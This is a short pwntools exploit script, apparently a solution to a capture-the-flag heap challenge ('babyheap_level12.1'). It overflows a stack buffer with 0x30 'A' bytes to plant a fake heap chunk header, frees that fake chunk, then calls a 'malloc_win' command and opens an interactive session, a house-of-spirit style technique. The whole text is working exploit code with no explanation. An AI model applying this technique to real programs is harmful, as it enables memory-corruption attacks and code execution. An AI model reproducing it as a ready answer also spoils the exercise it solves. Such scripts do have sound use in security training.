from pwn import *
BINARY = "/challenge/babyheap_level12.1"

p = process(BINARY)

fake_chunk = p64(0x0) + p64(0x61) + p64(0x0) + p64(0x0)
p.sendline(b'stack_scanf')
p.sendline(b'A' * 0x30 + fake_chunk)
p.recv()
p.sendline(b'stack_free')
p.sendline(b'stack_malloc_win')

p.interactive()